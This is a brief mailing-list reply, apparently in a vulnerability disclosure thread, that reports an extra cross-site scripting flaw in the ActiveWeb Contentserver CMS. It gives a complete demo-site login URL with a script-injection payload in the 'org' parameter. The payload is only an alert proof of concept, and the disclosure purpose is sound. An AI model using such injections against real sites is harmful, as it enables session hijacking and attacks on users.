Subject: Re: ActiveWeb Contentserver CMS Multiple Cross
	Site Scriptings

didn't find this in your list. Work for their online demo site not
sure if it works in actual deployment -

http://demo.active-web.de:80/sam.login/login.asp?org=>"><script>alert('xss');</script>&a=Y2FtcGZpcmU%253D&b=219f5bea94f21dc3e9207a32cfb69802&c=1c69e949%252D0941%252D46a1%252Da7b5%252D5a26b08548b1&d=58b69c32%252Dae15%252D4467%252Da02a%252D6c032b0f73b3&e=NThiNjljMzItYWUxNS00NDY3LWEwMmEtNmMwMzJiMGY3M2IzLWNhbXBmaXJl

don't miss to append other parameters as well -
